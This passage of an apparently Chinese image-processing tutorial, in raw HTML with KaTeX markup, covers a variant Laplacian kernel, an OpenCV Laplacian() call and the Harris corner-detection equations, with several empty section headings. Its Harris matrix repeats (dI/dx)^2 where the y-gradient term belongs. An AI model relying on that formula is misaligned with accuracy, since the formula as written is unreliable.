style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>变种拉普拉斯算子</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>4</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\begin{bmatrix}-1 &amp; 2 &amp; -1\\2 &amp; -4 &amp; 2\\-1 &amp; 2 &amp; -1\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">4</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>缺点：对于细小变化比较大的情况，以及噪声特别敏感。</li></ul><h3 id="代码实现-11"><a class="markdownIt-Anchor" href="#代码实现-11"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拉普拉斯的ksize必须是大于等于1的奇数，用于结果输出是当前值，还是周围3*3合起来的值</span></span><br><span class="line">Laplacian(src,dst,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">1.0</span>,BORDER_DEFAULT);</span><br></pre></td></tr></table></figure><h2 id="laplacian算子"><a class="markdownIt-Anchor" href="#laplacian算子"></a> Laplacian算子</h2><h2 id="高斯拉普拉斯log边缘检测"><a class="markdownIt-Anchor" href="#高斯拉普拉斯log边缘检测"></a> 高斯拉普拉斯LoG边缘检测</h2><h2 id="高斯差分dog边缘检测"><a class="markdownIt-Anchor" href="#高斯差分dog边缘检测"></a> 高斯差分DoG边缘检测</h2><h2 id="marr-hildreth边缘检测"><a class="markdownIt-Anchor" href="#marr-hildreth边缘检测"></a> Marr-Hildreth边缘检测</h2><h2 id="harris角点检测"><a class="markdownIt-Anchor" href="#harris角点检测"></a> Harris角点检测</h2><ul><li>根据图像的像素点，在相互垂直的x或者y方向上，如果有较大的梯度，则这个点就是角点。</li><li>数学描述：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mo>∑</mo><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></msub><mrow><mo stretchy="false">(</mo><mfrac><mrow><mi>d</mi><mi>I</mi></mrow><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mo>∑</mo><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></msub><mrow><mfrac><mrow><mi>d</mi><mi>I</mi></mrow><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mfrac><mrow><mi>d</mi><mi>I</mi></mrow><mrow><mi>d</mi><mi>y</mi></mrow></mfrac></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mo>∑</mo><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></msub><mrow><mfrac><mrow><mi>d</mi><mi>I</mi></mrow><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mfrac><mrow><mi>d</mi><mi>I</mi></mrow><mrow><mi>d</mi><mi>y</mi></mrow></mfrac></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mo>∑</mo><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></msub><mrow><mo stretchy="false">(</mo><mfrac><mrow><mi>d</mi><mi>I</mi></mrow><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">M=\begin{bmatrix} \sum_{S(p)}{(\frac{dI}{dx})^2} &amp;\sum_{S(p)}{\frac{dI}{dx}\frac{dI}{dy}} \\ \sum_{S(p)}{\frac{dI}{dx}\frac{dI}{dy}}  &amp;\sum_{S(p)}{(\frac{dI}{dx})^2}\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6112159999999998em;"><span style="top:-3.731108em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.22528999999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">p</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47471em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-2.369892em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.22528999999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">p</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47471em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1112159999999998em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6112159999999998em;"><span style="top:-3.731108em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.22528999999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">p</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47471em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span style="top:-2.369892em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.22528999999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">p</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47471em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1112159999999998em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">]</span></span></span></span></span></span></span></p><ul><li>计算xy方向的偏导数：<code>Ixy</code>、<code>Ixx</code>、<code>Iyx</code>、<code>Iyy</code>，计算相应最大的梯度</li><li>求取梯度：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow></munder><mrow><mi>w</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">[</mo><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi>u</mi><mo separator="true">,</mo><mi>y</mi><mo>+</mo><mi>v</mi><mo stretchy="false">)</mo><mo>−</mo><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><msup><mo stretchy="false">]</mo><mn>2</mn></msup></mrow></mrow><annotation encoding="application/x-tex">E(u,v)=\sum_{x,y}{w(x,y)[I(x+u,y+v)-I(x,y)]^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.4361180000000004em;vertical-align:-1.386113em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.8999949999999999em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.386113em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>其中：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">w(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>：窗口算子，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi>u</mi><mo separator="true">,</mo><mi>y</mi><mo>+</mo><mi>v</mi><mo stretchy="false">)</mo><mo>−</mo><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(x+u,y+v)-I(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>：偏移，u和v就是移动的大小</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo><mo>≅</mo><mo stretchy="false">[</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">]</mo><mtext>  </mtext><mi>M</mi><mtext>  </mtext><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>u</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>v</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">E(u,v)\cong[u,v]\;M\;\begin{bmatrix}u\\v\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≅</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mopen">[</span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">u</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></p><ul><li>求解M的最大值</li></ul><p><span class="katex-display"><span class="katex"><span 